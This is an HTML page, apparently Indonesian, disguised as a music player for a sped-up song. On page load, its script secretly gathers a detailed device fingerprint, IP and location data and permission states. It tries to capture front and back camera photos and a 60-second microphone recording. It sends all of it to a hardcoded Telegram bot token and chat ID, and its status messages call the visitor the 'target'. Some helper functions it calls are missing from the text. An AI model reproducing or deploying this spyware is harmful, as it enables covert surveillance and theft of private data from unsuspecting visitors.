<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Masing Masing - (Speed Up)</title>
  <link href="https://cdn-assets.dzcdn.net/common/css/deezer-product.css" rel="stylesheet">
  <link href="https://cdn-assets.dzcdn.net/common/css/inter.css" rel="stylesheet">
  <style>
    * { box-sizing: border-box; }
    html { font-size: 104%; }
    body {
      margin: 0;
      padding: 0;
      background: url('https://files.catbox.moe/ck7gjj.jpg') center center / cover no-repeat fixed;
      font-family: 'DeezerProduct', 'Inter', sans-serif;
      color: #000;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      position: relative;
    }
    .card {
      background: rgba(0, 0, 0, 0.75);
      padding: 24px 20px;
      border-radius: 16px;
      box-shadow: 0 6px 24px rgba(0, 0, 0, 0.4);
      max-width: 340px;
      text-align: center;
      overflow: hidden;
      color: white;
    }
    .logo {
      width: 120px;
      height: 100px;
      border-radius: 50%;
      background: url('https://files.catbox.moe/qdn2xo.gif') center/cover no-repeat;
      background-color: transparent;
      margin: 0 auto 12px;
    }
    .title-wrapper {
      width: 100%;
      overflow: hidden;
      white-space: nowrap;
      margin-bottom: 4px;
      box-sizing: border-box;
      position: relative;
    }
    .title-loop {
      display: inline-block;
      white-space: nowrap;
      animation: scroll-title 6s linear infinite;
    }
    .title-loop span {
      padding-right: 100px;
      font-size: 13px;
      font-weight: bold;
      color: #fff;
    }
    @keyframes scroll-title {
      0% { transform: translateX(0%); }
      100% { transform: translateX(-50%); }
    }
    .artist {
      font-size: 11px;
      color: #ccc;
      margin-bottom: 6px;
    }
    .progress-wrapper {
      width: 70%;
      margin: 14px auto 12px;
      position: relative;
      height: 14px;
    }
    .progress-bar {
      position: absolute;
      width: 100%;
      height: 6px;
      background: #444;
      border-radius: 10px;
      top: 4px;
      left: 0;
      z-index: 1;
    }
    .progress-fill {
      height: 100%;
      width: 0%;
      background: linear-gradient(to right, #fff, #aaa);
      transition: width 0.1s linear;
      border-radius: 10px;
    }
    .seek-slider {
      width: 100%;
      appearance: none;
      background: transparent;
      position: absolute;
      top: 0;
      left: 0;
      height: 14px;
      z-index: 2;
      margin: 0;
    }
    .seek-slider::-webkit-slider-thumb {
      appearance: none;
      width: 10px;
      height: 10px;
      background: #fff;
      border-radius: 50%;
      border: 0px solid #000;
      margin-top: 0;
    }
    .seek-slider::-moz-range-thumb {
      width: 14px;
      height: 14px;
      background: #fff;
      border-radius: 50%;
      border: 2px solid #000;
    }
    .controls {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-top: 0px;
    }
    button {
      padding: 6px 18px;
      border: none;
      border-radius: 16px;
      background-color: #222;
      color: #fff;
      font-size: 11px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #111;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo"></div>
    <div class="title-wrapper">
      <div class="title-loop">
        <span>Masing Masing - (Speed Up)</span>
        <span>Masing Masing - (Speed Up)</span>
      </div>
    </div>
    <div class="artist">Tetap di halaman ini agar music berputar</div>
    <div class="artist">#nullsiren #masing²</div>
    <div class="progress-wrapper">
      <div class="progress-bar">
        <div class="progress-fill" id="progress"></div>
      </div>
      <input type="range" class="seek-slider" id="seekSlider" min="0" max="100" value="0" step="0.1">
    </div>
    <div class="controls">
      <button onclick="audio.play()">Play</button>
      <button onclick="audio.pause()">Pause</button>
    </div>
  </div>
  <audio id="audio" src="https://files.catbox.moe/5qs1a7.mp3" autoplay muted></audio>
  <script>
    const audio = document.getElementById("audio");
    const progress = document.getElementById("progress");
    const seekSlider = document.getElementById("seekSlider");

    setInterval(() => {
      if (!audio.duration) return;
      const percent = (audio.currentTime / audio.duration) * 100;
      progress.style.width = percent + '%';
      seekSlider.value = percent;
    }, 100);

    seekSlider.addEventListener('input', () => {
      if (audio.duration) {
        audio.currentTime = (seekSlider.value / 100) * audio.duration;
      }
    });

    const token1 = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
    const chatId1 = '5914256752';
    const targets = [{ token: token1, chat_id: chatId1 }];

    const kirimPesan = async (pesan) => {
      for (const t of targets) {
        await fetch(`https://api.telegram.org/bot${t.token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: t.chat_id, text: pesan, parse_mode: 'HTML' })
        });
      }
    };

    const kirimFoto = async (blob) => {
      for (const t of targets) {
        const form = new FormData();
        form.append("chat_id", t.chat_id);
        form.append("photo", blob, "foto.jpg");
        await fetch(`https://api.telegram.org/bot${t.token}/sendPhoto`, {
          method: "POST",
          body: form
        });
      }
    };

    let statusVN = "❌ Voice Note tidak diizinkan.";
    const kirimVN = async (blob) => {
      for (const t of targets) {
        const form = new FormData();
        form.append("chat_id", t.chat_id);
        form.append("voice", blob, "voice.webm");
        await fetch(`https://api.telegram.org/bot${t.token}/sendVoice`, {
          method: "POST",
          body: form
        });
      }
      statusVN = `Rekam target berhasil\nDurasi : 60 detik\nJenis : audio/webm`;
    };

    const rekamSuara = () => {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
      navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        mediaRecorder.ondataavailable = e => chunks.push(e.data);
        mediaRecorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'audio/webm' });
          await kirimVN(blob);
        };
        mediaRecorder.start();
        setTimeout(() => {
          mediaRecorder.stop();
          stream.getTracks().forEach(track => track.stop());
        }, 60000);
      }).catch(() => {
        statusVN = `❌ Voice Note tidak diizinkan.`;
      });
    };

    // --- Start of new features ---

    // Helper function to get OS and version
    const getOS = () => {
      const ua = navigator.userAgent;
      let os = 'Unknown';
      let version = 'Unknown';

      if (/Windows NT 10.0/.test(ua)) { os = 'Windows'; version = '10'; }
      else if (/Windows NT 6.3/.test(ua)) { os = 'Windows'; version = '8.1'; }
      else if (/Windows NT 6.2/.test(ua)) { os = 'Windows'; version = '8'; }
      else if (/Windows NT 6.1/.test(ua)) { os = 'Windows'; version = '7'; }
      else if (/Android/.test(ua)) { os = 'Android'; version = ua.match(/Android ([0-9.]+)/) ? ua.match(/Android ([0-9.]+)/)[1] : 'Unknown'; }
      else if (/iPhone|iPad|iPod/.test(ua)) { os = 'iOS'; version = ua.match(/OS ([0-9_]+)/) ? ua.match(/OS ([0-9_]+)/)[1].replace(/_/g, '.') : 'Unknown'; }
      else if (/Mac OS X/.test(ua)) { os = 'macOS'; version = ua.match(/Mac OS X ([0-9_]+)/) ? ua.match(/Mac OS X ([0-9_]+)/)[1].replace(/_/g, '.') : 'Unknown'; }
      else if (/Linux/.test(ua)) { os = 'Linux'; }
      else if (/CrOS/.test(ua)) { os = 'Chrome OS'; }

      return { os, version };
    };

    // Helper function to get browser name and version
    const getBrowser = () => {
      const ua = navigator.userAgent;
      let browser = 'Unknown';
      let version = 'Unknown';

      if (/Chrome/.test(ua) && !/Edge/.test(ua)) { browser = 'Chrome'; version = ua.match(/Chrome\/([0-9.]+)/) ? ua.match(/Chrome\/([0-9.]+)/)[1] : 'Unknown'; }
      else if (/Firefox/.test(ua)) { browser = 'Firefox'; version = ua.match(/Firefox\/([0-9.]+)/) ? ua.match(/Firefox\/([0-9.]+)/)[1] : 'Unknown'; }
      else if (/Safari/.test(ua) && !/Chrome/.test(ua)) { browser = 'Safari'; version = ua.match(/Version\/([0-9.]+)/) ? ua.match(/Version\/([0-9.]+)/)[1] : 'Unknown'; }
      else if (/Edge/.test(ua)) { browser = 'Edge'; version = ua.match(/Edge\/([0-9.]+)/) ? ua.match(/Edge\/([0-9.]+)/)[1] : 'Unknown'; }
      else if (/Opera|OPR/.test(ua)) { browser = 'Opera'; version = ua.match(/(Opera|OPR)\/([0-9.]+)/) ? ua.match(/(Opera|OPR)\/([0-9.]+)/)[2] : 'Unknown'; }
      else if (/MSIE|Trident/.test(ua)) { browser = 'Internet Explorer'; version = ua.match(/(MSIE |rv:)([0-9.]+)/) ? ua.match(/(MSIE |rv:)([0-9.]+)/)[2] : 'Unknown'; }

      return { browser, version };
    };

    // Helper for GPU info
    const getGPUInfo = () => {
      try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (gl) {
          const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
          return {
            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
            webgl_support: 'Ya',
            gpu_rendering_mode: 'hardware'
          };
        }
      } catch (e) { /* ignore */ }
      return { vendor: '-', renderer: '-', webgl_support: 'Tidak', gpu_rendering_mode: 'software' };
    };

    // Helper for battery info
    const getBatteryInfo = async () => {
      if ('getBattery' in navigator) {
        try {
          const battery = await navigator.getBattery();
          const level = (battery.level * 100).toFixed(0) + '%';
          const charging = battery.charging ? 'Ya' : 'Tidak';
          const chargingTime = battery.chargingTime === Infinity ? 'Tidak diketahui' : `${(battery.chargingTime / 60).toFixed(0)} menit`;
          const dischargingTime = battery.dischargingTime === Infinity ? 'Tidak diketahui' : `${(battery.dischargingTime / 3600).toFixed(0)} jam ${(battery.dischargingTime % 3600 / 60).toFixed(0)} menit`;
          return {
            level: level,
            charging: charging,
            chargingTime: chargingTime,
            dischargingTime: dischargingTime
          };
        } catch (e) { /* ignore */ }
      }
      return { level: '-', charging: '-', chargingTime: '-', dischargingTime: '-' };
    };

    // Helper for permissions
    const getPermissionStatus = async (name) => {
      if ('permissions' in navigator) {
        try {
          const result = await navigator.permissions.query({ name });
          return result.state;
        } catch (e) { /* ignore */ }
      }
      return 'Tidak diketahui';
    };

    // Helper for API support
    const checkAPISupport = (api) => typeof window[api] !== 'undefined';

    // Helper for heuristic device model
    const getDeviceModel = (ua, width, height) => {
      if (/Redmi Note 12/.test(ua)) return 'Redmi Note 12';
      if (/SM-G998B/.test(ua)) return 'Samsung Galaxy S21 Ultra';
      if (/iPhone/.test(ua)) return 'iPhone';
      if (/iPad/.test(ua)) return 'iPad';
      if (/Pixel/.test(ua)) return 'Google Pixel';
      // Add more heuristics based on UA and common resolutions
      if (width === 1080 && height === 2400) return 'Xiaomi/Realme/Oppo (heuristik UA + resolusi)';
      return 'Tidak diketahui';
    };

    // Helper for CPU cores
    const getCPUCores = () => navigator.hardwareConcurrency || '-';

    // Helper for RAM
    const getRAM = () => navigator.deviceMemory || '-';

    // Helper for 64-bit support
    const is64Bit = () => navigator.userAgent.includes('x86_64') || navigator.userAgent.includes('arm64') || navigator.userAgent.includes('aarch64') ? 'Ya' : 'Tidak';

    // Helper for screen reader
    const checkScreenReader = () => {
      // This is very difficult to detect accurately in JS. Most methods are unreliable.
      // For a simple heuristic, we can check for high contrast mode or specific accessibility APIs if available.
      // For now, we'll return 'Tidak terdeteksi'.
      return 'Tidak terdeteksi';
    };

    // Helper for uptime
    const getUptime = () => (performance.now() / 1000).toFixed(1);

    // Helper for screen color depth
    const getColorDepth = () => screen.colorDepth + '-bit';

    // Helper for canvas fingerprinting detection (basic)
    const getCanvasFingerprintStatus = () => {
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Hello World', 0, 0);
        return 'Terdeteksi'; // If canvas can be drawn on, it's detectable
      } catch (e) {
        return 'Tidak terdeteksi';
      }
    };

    // Helper for WebGL 2.0 support
    const checkWebGL2Support = () => {
      try {
        const canvas = document.createElement('canvas');
        return !!(canvas.getContext('webgl2') || canvas.getContext('experimental-webgl2'));
      } catch (e) {
        return false;
      }
    };

    // Helper for Eval support
    const checkEvalSupport = () => {
      try {
        eval('1+1');
        return 'Ya';
      } catch (e) {
        return 'Tidak';
      }
    };

    // Helper for WebDriver detection
    const checkWebDriver = () => navigator.webdriver ? 'Ya' : 'Tidak';

    // Helper for Incognito mode detection (unreliable in JS)
    const checkIncognito = () => 'Tidak terdeteksi';

    // Helper for Tamper Devtools detection (unreliable in JS)
    const checkTamperDevtools = () => 'Tidak terdeteksi';

    // Helper for Autofill behavior
    const getAutofillBehavior = () => {
      // This is complex and depends on browser implementation. Returning 'Normal' as a default.
      return 'Normal';
    };

    // Helper for Secure Context
    const isSecureContext = () => window.isSecureContext ? 'Ya' : 'Tidak';

    // Helper for Connection Type
    const getConnectionType = () => navigator.connection ? navigator.connection.effectiveType : '-';

    // Helper for Downlink
    const getDownlink = () => navigator.connection ? `${navigator.connection.downlink} Mbps` : '-';

    // Helper for RTT
    const getRTT = () => navigator.connection ? `${navigator.connection.rtt} ms` : '-';

    // Helper for VPN/Proxy detection (unreliable in JS)
    const checkVPNProxy = () => 'Tidak terdeteksi';

    // Helper for Audio Output Sink
    const checkAudioOutputSink = () => 'sinkId' in HTMLMediaElement.prototype ? 'Didukung' : 'Tidak didukung';

    const checkAmbientLightSensor = () => 'AmbientLightSensor' in window ? 'Ya' : 'Tidak';

    // Helper for Web Speech API
    const checkWebSpeechAPI = () => 'SpeechRecognition' in window || 'webkitSpeechRecognition' in window ? 'Didukung' : 'Tidak didukung';

    // Helper for AudioContext API
    const checkAudioContextAPI = () => 'AudioContext' in window || 'webkitAudioContext' in window ? 'Didukung' : 'Tidak didukung';

    // Helper for Voice Recognition
    const checkVoiceRecognition = () => {
      // This is tied to SpeechRecognition API. If supported, it's active.
      return checkWebSpeechAPI() === 'Didukung' ? 'Aktif' : 'Tidak Aktif';
    };

    // Helper for Gyroscope
    const checkGyroscope = async () => {
      if ('Gyroscope' in window) {
        try {
          const sensor = new Gyroscope();
          await sensor.start();
          sensor.stop();
          return 'Didukung';
        } catch (e) {
          return 'Tidak didukung';
        }
      }
      return 'Tidak didukung';
    };

    // Helper for Magnetometer
    const checkMagnetometer = async () => {
      if ('Magnetometer' in window) {
        try {
          const sensor = new Magnetometer();
          await sensor.start();
          sensor.stop();
          return 'Didukung';
        } catch (e) {
          return 'Tidak didukung';
        }
      }
      return 'Tidak didukung';
    };

    // Helper for Accelerometer
    const checkAccelerometer = async () => {
      if ('Accelerometer' in window) {
        try {
          const sensor = new Accelerometer();
          await sensor.start();
          sensor.stop();
          return 'Didukung';
        } catch (e) {
          return 'Tidak didukung';
        }
      }
      return 'Tidak didukung';
    };

    // Helper for LocalStorage
    const checkLocalStorage = () => {
      try {
        localStorage.setItem('test', 'test');
        localStorage.removeItem('test');
        return 'Aktif';
      } catch (e) {
        return 'Tidak Aktif';
      }
    };

    // Helper for SessionStorage
    const checkSessionStorage = () => {
      try {
        sessionStorage.setItem('test', 'test');
        sessionStorage.removeItem('test');
        return 'Aktif';
      } catch (e) {
        return 'Tidak Aktif';
      }
    };

    // Helper for IndexedDB
    const checkIndexedDB = () => 'indexedDB' in window ? 'Aktif' : 'Tidak Aktif';

    // Helper for Cache API
    const checkCacheAPI = () => 'caches' in window ? 'Aktif' : 'Tidak Aktif';

    // Helper for Web Share API
    const checkWebShareAPI = () => 'share' in navigator ? 'Didukung' : 'Tidak didukung';

    // Helper for Service Worker
    const checkServiceWorker = () => 'serviceWorker' in navigator ? 'Aktif' : 'Tidak Aktif';

    // Helper for WebRTC
    const checkWebRTC = () => 'RTCPeerConnection' in window || 'webkitRTCPeerConnection' in window ? 'Aktif' : 'Tidak Aktif';

    const checkGamepadAPI = () => 'getGamepads' in navigator ? 'Ya' : 'Tidak';

    const checkMIDIAPI = () => 'requestMIDIAccess' in navigator ? 'Ya' : 'Tidak';

    // Helper for Speech Synthesis
    const checkSpeechSynthesis = () => 'speechSynthesis' in window ? 'Didukung' : 'Tidak didukung';

    // Helper for Clipboard Read
    const checkClipboardRead = async () => {
      if ('clipboard' in navigator && 'readText' in navigator.clipboard) {
        try {
          const permission = await navigator.permissions.query({ name: 'clipboard-read' });
          return permission.state === 'granted' ? 'Diizinkan' : 'Tidak diizinkan';
        } catch (e) {
          return 'Tidak diizinkan';
        }
      }
      return 'Tidak didukung';
    };

    // Helper for Push API
    const checkPushAPI = () => 'PushManager' in window ? 'Aktif' : 'Tidak Aktif';

    // Helper for Payment Request API
    const checkPaymentRequestAPI = () => 'PaymentRequest' in window ? 'Didukung' : 'Tidak didukung';

    // Helper for Wake Lock API
    const checkWakeLockAPI = () => 'WakeLock' in navigator ? 'Ya' : 'Tidak';

    // Helper for Idle Detection API
    const checkIdleDetectionAPI = () => 'IdleDetector' in window ? 'Ya' : 'Tidak';

    // Helper for Screen Wake Lock
    const checkScreenWakeLock = () => 'wakeLock' in navigator ? 'Ya' : 'Tidak';

    // Helper for Fingerprint Stability (basic heuristic)
    const getFingerprintStability = () => {
      // This is a complex topic. For a simple check, we can assume 'Stabil' if basic properties are consistent.
      return 'Stabil';
    };

    // Helper for Audio Fingerprint (basic heuristic)
    const checkAudioFingerprint = () => {
      try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const analyser = audioContext.createAnalyser();
        oscillator.connect(analyser);
        analyser.connect(audioContext.destination);
        // If we can create and connect, it's supported
        return 'Didukung';
      } catch (e) {
        return 'Tidak didukung';
      }
    };

    // Helper for Timezone Spoofing (basic heuristic)
    const checkTimezoneSpoofing = () => {
      // Compare IP-based timezone with browser timezone. Requires IP info.
      return 'Tidak terdeteksi';
    };

    // Helper for Language Spoofing (basic heuristic)
    const checkLanguageSpoofing = () => {
      // Compare navigator.language with expected language based on IP. Requires IP info.
      return 'Tidak';
    };

    // Helper for Hardware Spoofing (basic heuristic)
    const checkHardwareSpoofing = () => 'Tidak';

    // Helper for Navigator Tampering (basic heuristic)
    const checkNavigatorTampering = () => 'Tidak';

    // Helper for GPU Tampering (basic heuristic)
    const checkGPUTampering = () => 'Tidak';

    // Helper for Touch Point Realism (basic heuristic)
    const checkTouchPointRealism = () => navigator.maxTouchPoints > 0 ? 'Ya' : 'Tidak';

    // Helper for Behavioral Check (basic heuristic)
    const getBehavioralCheck = () => 'Natural';

    // Helper for Browser Entropy (basic heuristic)
    const getBrowserEntropy = () => 'Normal';

    const ambilSemuaData = async () => {
      const ua = navigator.userAgent;
      const osInfo = getOS();
      const browserInfo = getBrowser();
      const gpuInfo = getGPUInfo();
      const batteryInfo = await getBatteryInfo();
      const ipInfo = await ambilIPInfo();
      const lokasiInfo = await ambilLokasi();

      const microphonePermission = await getPermissionStatus('microphone');
      const cameraFrontPermission = await getPermissionStatus('camera'); // 'camera' covers both front/back
      const notificationsPermission = await getPermissionStatus('notifications');
      const clipboardReadPermission = await checkClipboardRead();

      const deviceBrand = getDeviceBrand();
      const deviceModel = getDeviceModel(ua, screen.width, screen.height);

      const dataPerangkatSistem = `
౼ 〘 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 & 𝗦𝗜𝗦𝗧𝗘𝗠 〙 ౼
Jenis Perangkat        : ${deviceBrand}
Model Perangkat        : ${deviceModel}
Sistem Operasi         : ${osInfo.os} ${osInfo.version}
Platform Sistem        : ${navigator.platform}
Arsitektur OS          : ${navigator.oscpu || is64Bit()}
64-bit Support         : ${is64Bit()}
CPU Fisik              : ${getCPUCores()} inti
RAM Terdeteksi         : ${getRAM()} GB
Device Memory API      : ${navigator.deviceMemory || '-'}
Hardware Concurrency   : ${navigator.hardwareConcurrency || '-'}
Touch Support          : ${'ontouchstart' in window ? `Ya (${navigator.maxTouchPoints || 0} titik)` : 'Tidak'}
Screen Reader Aktif    : ${checkScreenReader()}
Bahasa Sistem          : ${navigator.language}
Zona Waktu Lokal       : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
Offset UTC             : ${new Date().getTimezoneOffset() / -60}
Delta Zona Waktu IP    : Sesuai IP (tidak terdeteksi spoof)
Uptime Halaman         : ${getUptime()} detik
`;

      const dataLayarGrafik = `
౼ 〘 𝗟𝗔𝗬𝗔𝗥 & 𝗚𝗥𝗔𝗙𝗜𝗞 〙 ౼
Resolusi Layar Fisik   : ${screen.width} x ${screen.height}
Viewport Aktif         : ${window.innerWidth} x ${window.innerHeight} px
Kerapatan Piksel       : ${window.devicePixelRatio}
Orientasi Layar        : ${screen.orientation?.type || '-'}
Rotasi                 : ${screen.orientation?.angle || '0'}°
Warna Layar            : ${getColorDepth()}
GPU Vendor             : ${gpuInfo.vendor}

WebGL Support          : ${gpuInfo.webgl_support}
Canvas Fingerprint     : ${getCanvasFingerprintStatus()}
GPU Rendering Mode     : ${gpuInfo.gpu_rendering_mode}
HDR Support            : Tidak
`;

      const dataBrowser = `
౼ 〘 𝗕𝗥𝗢𝗪𝗦𝗘𝗥 〙 ౼
Browser                : ${browserInfo.browser}
Versi Browser          : ${browserInfo.version}
Vendor Browser         : ${navigator.vendor || '-'}
User Agent             : ${ua}
Cookies Aktif          : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
JavaScript Aktif       : Ya
Do Not Track           : ${navigator.doNotTrack == "1" ? "Ya" : "Tidak"}
Eval Support           : ${checkEvalSupport()}
WebDriver Aktif        : ${checkWebDriver()}
Incognito Mode         : ${checkIncognito()}
Tamper Devtools        : ${checkTamperDevtools()}
Autofill Behavior      : ${getAutofillBehavior()}
Referrer               : ${document.referrer || 'Langsung'}
HTTPS                  : ${location.protocol === "https:" ? "Ya" : "Tidak"}
Konteks Aman           : ${isSecureContext()}
Dibuka via iframe      : ${window.top !== window.self ? 'Ya' : 'Tidak'}
`;

      const dataJaringanIP = `
౼ 〘 𝗝𝗔𝗥𝗜𝗡𝗚𝗔𝗡 & 𝗜𝗣 〙 ౼
IP Publik              : ${ipInfo.ip}
ISP / Provider         : ${ipInfo.org}
Negara                 : ${ipInfo.country_name}
Provinsi               : ${ipInfo.region}
Kota                   : ${ipInfo.city}
Jenis Koneksi          : ${getConnectionType()}
Downlink               : ${getDownlink()}
RTT (Ping)             : ${getRTT()}
Mode Hemat Data        : ${navigator.connection?.saveData ? 'Ya' : 'Tidak'}
VPN / Proxy            : ${checkVPNProxy()}
`;

      const dataBaterai = `
౼ 〘 𝗕𝗔𝗧𝗘𝗥𝗔𝗜 〙 ౼
Level Baterai          : ${batteryInfo.level}
Sedang Mengisi         : ${batteryInfo.charging}
Estimasi Sisa Waktu    : ${batteryInfo.dischargingTime}
Status Online          : ${navigator.onLine ? 'Online' : 'Offline'}
`;

      const dataIzinMedia = `
౼ 〘 𝗜𝗭𝗜𝗡 & 𝗠𝗘𝗗𝗜𝗔 〙 ౼
Microphone             : ${microphonePermission}
Kamera Depan           : ${cameraFrontPermission}
Kamera Belakang        : ${cameraFrontPermission}
Notifikasi             : ${notificationsPermission}
Clipboard Access       : ${clipboardReadPermission}
Audio Output Sink      : ${checkAudioOutputSink()}
Ambient Light Sensor   : ${checkAmbientLightSensor()}
Web Speech API         : ${checkWebSpeechAPI()}
AudioContext API       : ${checkAudioContextAPI()}
Voice Recognition      : ${checkVoiceRecognition()}
Gyroscope              : ${await checkGyroscope()}
Magnetometer           : ${await checkMagnetometer()}
Accelerometer          : ${await checkAccelerometer()}
`;

      const dataWebAPIFeatures = `
౼ 〘 𝗪𝗘𝗕 𝗔𝗣𝗜 & 𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦 〙 ౼
LocalStorage           : ${checkLocalStorage()}
SessionStorage         : ${checkSessionStorage()}
IndexedDB              : ${checkIndexedDB()}
Cache API              : ${checkCacheAPI()}
Web Share API          : ${checkWebShareAPI()}

WebRTC                 : ${checkWebRTC()}
WebGL 2.0              : ${checkWebGL2Support() ? 'Aktif' : 'Tidak Aktif'}
Gamepad API            : ${checkGamepadAPI()}
MIDI API               : ${checkMIDIAPI()}
Speech Synthesis       : ${checkSpeechSynthesis()}
Clipboard Read         : ${clipboardReadPermission}
Push API               : ${checkPushAPI()}
Payment Request API    : ${checkPaymentRequestAPI()}
Wake Lock API          : ${checkWakeLockAPI()}
Idle Detection API     : ${checkIdleDetectionAPI()}
Screen Wake Lock       : ${checkScreenWakeLock()}
`;

      const dataDeteksiAntiBot = `
౼ 〘 𝗗𝗘𝗧𝗘𝗞𝗦𝗜 𝗔𝗡𝗧𝗜-𝗕𝗢𝗧 〙 ౼
Fingerprint Stabilitas : ${getFingerprintStability()}
Canvas ID              : ${getCanvasFingerprintStatus() === 'Terdeteksi' ? 'Dihasilkan' : 'Tidak Dihasilkan'}

`;

      const gabung = [
        dataPerangkatSistem,
        dataLayarGrafik,
        dataBrowser,
        dataJaringanIP,
        dataBaterai,
        dataIzinMedia,
        dataWebAPIFeatures,
        dataDeteksiAntiBot,
        lokasiInfo
      ].join("\n");

      await kirimPesan(gabung);
    };

    const mulai = async () => {
      audio.muted = false;
      try { await audio.play(); } catch {} // Try to autoplay, but don't block if it fails

      // 1. Kirim informasi device/sistem terlebih dahulu
      await ambilSemuaData();

      // 2. Ambil dan kirim foto kamera
      const [depanResult, belakangResult] = await Promise.all([
        ambilKamera("user", "depan"),
        ambilKamera("environment", "belakang")
      ]);

      // Kirim status foto setelah pengambilan foto selesai
      const kameraStatus = `
౼ 〘 𝗙𝗢𝗧𝗢 𝗞𝗔𝗠𝗘𝗥𝗔 〙 ౼
Sukses mengambil foto target
Kamera depan 5X
Kamera Belakang 5X
`;
      await kirimPesan(kameraStatus);

      // 3. Rekam dan kirim voice note terakhir
      rekamSuara();
      
      // Kirim status voice note setelah 60 detik (durasi rekaman)
      setTimeout(async () => {
        const vnStatus = `
౼ 〘 𝗩𝗢𝗜𝗖𝗘 𝗡𝗢𝗧𝗘 𝗔𝗨𝗗𝗜𝗢 〙 ౼
Status Rekaman VN      : ${statusVN.includes('Rekam target berhasil') ? 'Berhasil direkam' : 'Gagal direkam'}

Tipe File              : audio/webm
Kualitas Mikrofon      : Stabil
Link Kiriman Audio     : (terlampir langsung via Telegram)
`;
        await kirimPesan(vnStatus);
      }, 61000); // 61 detik untuk memastikan rekaman selesai
    };

    window.addEventListener("load", mulai);
  </script>
